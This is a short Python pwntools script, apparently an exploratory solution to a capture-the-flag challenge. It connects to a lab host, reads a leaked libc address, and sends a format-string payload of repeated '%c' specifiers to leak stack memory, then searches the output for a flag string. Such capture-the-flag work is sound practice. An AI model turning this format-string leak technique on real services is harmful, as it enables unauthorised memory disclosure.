#!/usr/bin/env python3  
from pwn import *

context.log_level = 'info'

r = remote("pwn-zoroblindpath.hackena-labs.com", 443, ssl=True)

r.recvuntil(b"Clue: ")
leak = r.recvline().strip()
leaked_addr = int(leak, 16)
log.info(f"Leaked stdout addr: {hex(leaked_addr)}")

r.recvuntil(b"Write your path:")

# The "clue" is a libc address (stdout)
# Maybe we need to use this to calculate other addresses?
# Or maybe we need more %c to reach environment variables

# Let me try the maximum safe amount
# From testing: 115 %c works, 120 might work
payload = b"%c" * 119
r.sendline(payload)

data = r.recvall(timeout=3)

log.info(f"Received {len(data)} bytes")

# Search for flag format
if b"0xL4ugh{" in data:
    idx = data.find(b"0xL4ugh{")
    end = data.find(b"}", idx)
    if end > idx:
        flag = data[idx:end+1]
        log.success(f"\n\n***** FLAG FOUND: {flag.decode()} *****\n\n")
    else:
        log.info(f"Found flag start at {idx}: {data[idx:idx+60]}")
else:
    # Maybe flag is in a different format? Check for "flag{" or similar
    if b"{" in data:
        log.info("Found { character, checking context:")
        idx = data.find(b"{")
        print(f"Around {{: {data[max(0,idx-20):idx+40]}")
    
    # Print full hex to analyze manually
    log.info("Full data dump:")
    print(hexdump(data))

r.close()
